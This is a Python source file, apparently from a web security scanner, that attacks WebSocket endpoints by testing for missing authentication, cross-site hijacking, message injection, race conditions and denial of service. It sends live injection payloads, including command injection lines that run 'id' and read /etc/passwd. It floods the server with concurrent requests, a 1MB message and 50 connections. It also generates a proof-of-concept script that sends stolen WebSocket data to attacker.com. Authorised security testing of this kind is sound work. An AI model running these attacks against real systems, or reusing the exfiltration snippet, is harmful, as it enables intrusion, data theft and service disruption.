"""
WebSocket Security Testing Module

Tests for:
- Message injection
- Authentication bypass
- Authorization bypass
- Cross-Site WebSocket Hijacking (CSWSH)
- Race conditions
- DoS vulnerabilities
"""

import asyncio
import aiohttp
import json
import re
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
import logging
import time

logger = logging.getLogger(__name__)


@dataclass
class WSFinding:
    vuln_type: str
    severity: str
    url: str
    description: str
    evidence: str
    poc: str


class WebSocketTester:
    """WebSocket security testing"""

    def __init__(self):
        self.findings: List[WSFinding] = []
        self.messages_received: List[Dict] = []

    def _http_to_ws(self, url: str) -> str:
        """Convert HTTP URL to WebSocket URL"""
        parsed = urlparse(url)
        ws_scheme = "wss" if parsed.scheme == "https" else "ws"
        return f"{ws_scheme}://{parsed.netloc}{parsed.path}"

    # ==================== DISCOVERY ====================

    async def discover_websockets(self, base_url: str) -> List[str]:
        """Discover WebSocket endpoints"""
        ws_endpoints = []

        # Common WebSocket paths
        common_paths = [
            "/ws",
            "/websocket",
            "/socket",
            "/socket.io",
            "/sockjs",
            "/realtime",
            "/live",
            "/stream",
            "/events",
            "/notifications",
            "/chat",
            "/api/ws",
            "/api/websocket",
            "/graphql",  # GraphQL subscriptions
        ]

        base_ws = self._http_to_ws(base_url)

        for path in common_paths:
            ws_url = f"{base_ws.rstrip('/')}{path}"
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.ws_connect(ws_url, timeout=5) as ws:
                        ws_endpoints.append(ws_url)
                        await ws.close()
            except:
                pass

        return ws_endpoints

    # ==================== CONNECTION TESTING ====================

    async def test_connection(self, ws_url: str, headers: Dict = None) -> Tuple[bool, Optional[str]]:
        """Test WebSocket connection"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.ws_connect(ws_url, headers=headers, timeout=10) as ws:
                    # Try to receive initial message
                    try:
                        msg = await asyncio.wait_for(ws.receive(), timeout=3)
                        return True, msg.data if hasattr(msg, 'data') else str(msg)
                    except asyncio.TimeoutError:
                        return True, None
        except Exception as e:
            return False, str(e)

    # ==================== AUTH BYPASS ====================

    async def test_auth_bypass(self, ws_url: str) -> List[WSFinding]:
        """Test for authentication bypass"""
        findings = []

        # Test 1: Connection without credentials
        connected, msg = await self.test_connection(ws_url)

        if connected:
            findings.append(WSFinding(
                vuln_type="WebSocket Auth Bypass",
                severity="high",
                url=ws_url,
                description="WebSocket connection accepted without authentication",
                evidence=f"Connected successfully, received: {msg[:100] if msg else 'empty'}",
                poc=f"""# WebSocket Auth Bypass PoC
const ws = new WebSocket("{ws_url}");
ws.onopen = () => console.log("Connected without auth!");
ws.onmessage = (e) => console.log(e.data);
"""
            ))

        # Test 2: Connection with manipulated origin
        origins = [
            "https://attacker.com",
            "null",
            "",
            "https://evil.target.com",
        ]

        for origin in origins:
            headers = {"Origin": origin} if origin else {}
            connected, msg = await self.test_connection(ws_url, headers)

            if connected:
                findings.append(WSFinding(
                    vuln_type="WebSocket CORS Bypass",
                    severity="medium",
                    url=ws_url,
                    description=f"WebSocket accepts connections from origin: {origin or 'none'}",
                    evidence="Connection accepted with foreign origin",
                    poc=f"""# CSWSH PoC
<!-- On attacker.com -->
<script>
var ws = new WebSocket("{ws_url}");
ws.onmessage = (e) => fetch("https://attacker.com/steal?data=" + e.data);
</script>
"""
                ))
                break

        return findings

    # ==================== MESSAGE INJECTION ====================

    async def test_message_injection(self, ws_url: str, auth_headers: Dict = None) -> List[WSFinding]:
        """Test for message injection vulnerabilities"""
        findings = []

        injection_payloads = [
            # XSS
            {"type": "message", "data": "<script>alert(1)</script>"},
            {"type": "message", "data": "<img src=x onerror=alert(1)>"},

            # SQL Injection
            {"type": "query", "data": "' OR '1'='1"},
            {"id": "1' OR '1'='1", "action": "get"},

            # Command Injection
            {"command": "; id", "args": []},
            {"cmd": "| cat /etc/passwd"},

            # NoSQL Injection
            {"query": {"$ne": None}},
            {"filter": {"$gt": ""}},

            # Template Injection
            {"template": "{{7*7}}"},
            {"name": "${7*7}"},

            # IDOR
            {"user_id": 1},
            {"user_id": "admin"},
            {"action": "get_user", "id": 0},
        ]

        try:
            async with aiohttp.ClientSession() as session:
                async with session.ws_connect(ws_url, headers=auth_headers, timeout=10) as ws:
                    for payload in injection_payloads:
                        # Send payload
                        await ws.send_json(payload)

                        # Wait for response
                        try:
                            msg = await asyncio.wait_for(ws.receive(), timeout=2)
                            response = msg.data if hasattr(msg, 'data') else ""

                            # Check for injection indicators
                            if any(x in str(response).lower() for x in
                                   ["error", "sql", "syntax", "exception", "49", "root:", "admin"]):
                                findings.append(WSFinding(
                                    vuln_type="WebSocket Injection",
                                    severity="high",
                                    url=ws_url,
                                    description=f"Potential injection via WebSocket message",
                                    evidence=f"Payload: {payload}, Response: {response[:200]}",
                                    poc=f"""# WebSocket Injection PoC
const ws = new WebSocket("{ws_url}");
ws.onopen = () => ws.send(JSON.stringify({json.dumps(payload)}));
"""
                                ))
                        except asyncio.TimeoutError:
                            pass

        except Exception as e:
            logger.error(f"WebSocket injection test failed: {e}")

        return findings

    # ==================== RACE CONDITIONS ====================

    async def test_race_condition(self, ws_url: str, auth_headers: Dict = None) -> List[WSFinding]:
        """Test for race conditions in WebSocket handlers"""
        findings = []

        # Test payload that might be vulnerable to race conditions
        race_payloads = [
            {"action": "transfer", "amount": 100, "to": "attacker"},
            {"action": "redeem", "code": "PROMO"},
            {"action": "vote", "option": 1},
            {"action": "claim", "reward_id": 1},
        ]

        for payload in race_payloads:
            success_count = 0

            async def send_concurrent():
                nonlocal success_count
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.ws_connect(ws_url, headers=auth_headers, timeout=5) as ws:
                            await ws.send_json(payload)
                            msg = await asyncio.wait_for(ws.receive(), timeout=2)
                            if "success" in str(msg.data).lower():
                                success_count += 1
                except:
                    pass

            # Send 10 concurrent requests
            tasks = [send_concurrent() for _ in range(10)]
            await asyncio.gather(*tasks)

            if success_count > 1:
                findings.append(WSFinding(
                    vuln_type="WebSocket Race Condition",
                    severity="high",
                    url=ws_url,
                    description=f"Action '{payload.get('action')}' executed {success_count} times concurrently",
                    evidence=f"Sent 10 concurrent messages, {success_count} succeeded",
                    poc=f"""# Race Condition PoC
Promise.all(Array(10).fill().map(() => {{
  const ws = new WebSocket("{ws_url}");
  ws.onopen = () => ws.send(JSON.stringify({json.dumps(payload)}));
}}));
"""
                ))

        return findings

    # ==================== DOS TESTING ====================

    async def test_dos(self, ws_url: str) -> List[WSFinding]:
        """Test for DoS vulnerabilities"""
        findings = []

        # Test 1: Large message
        try:
            async with aiohttp.ClientSession() as session:
                async with session.ws_connect(ws_url, timeout=10) as ws:
                    large_payload = "A" * 1000000  # 1MB
                    start = time.time()
                    await ws.send_str(large_payload)

                    try:
                        msg = await asyncio.wait_for(ws.receive(), timeout=5)
                        elapsed = time.time() - start

                        if elapsed > 3:
                            findings.append(WSFinding(
                                vuln_type="WebSocket DoS - Large Message",
                                severity="medium",
                                url=ws_url,
                                description="Server took long time to process large message",
                                evidence=f"1MB message processed in {elapsed:.2f}s",
                                poc="Send large payloads to exhaust server resources"
                            ))
                    except asyncio.TimeoutError:
                        pass
        except:
            pass

        # Test 2: Rapid connections
        connection_count = 0
        async def rapid_connect():
            nonlocal connection_count
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.ws_connect(ws_url, timeout=2) as ws:
                        connection_count += 1
                        await asyncio.sleep(1)
            except:
                pass

        tasks = [rapid_connect() for _ in range(50)]
        await asyncio.gather(*tasks)

        if connection_count >= 45:
            findings.append(WSFinding(
                vuln_type="WebSocket DoS - No Connection Limit",
                severity="medium",
                url=ws_url,
                description="Server accepts many concurrent WebSocket connections",
                evidence=f"Opened {connection_count}/50 concurrent connections",
                poc="Open many concurrent connections to exhaust server resources"
            ))

        return findings

    # ==================== FULL TEST ====================

    async def full_test(self, base_url: str, auth_headers: Dict = None) -> List[WSFinding]:
        """Run all WebSocket security tests"""
        all_findings = []

        # Discover WebSocket endpoints
        ws_endpoints = await self.discover_websockets(base_url)

        if not ws_endpoints:
            # Try converting base URL to WebSocket
            ws_url = self._http_to_ws(base_url)
            ws_endpoints = [ws_url]

        for ws_url in ws_endpoints:
            logger.info(f"Testing WebSocket: {ws_url}")

            # Auth bypass
            findings = await self.test_auth_bypass(ws_url)
            all_findings.extend(findings)

            # Message injection
            findings = await self.test_message_injection(ws_url, auth_headers)
            all_findings.extend(findings)

            # Race conditions
            findings = await self.test_race_condition(ws_url, auth_headers)
            all_findings.extend(findings)

            # DoS
            findings = await self.test_dos(ws_url)
            all_findings.extend(findings)

        self.findings = all_findings
        return all_findings
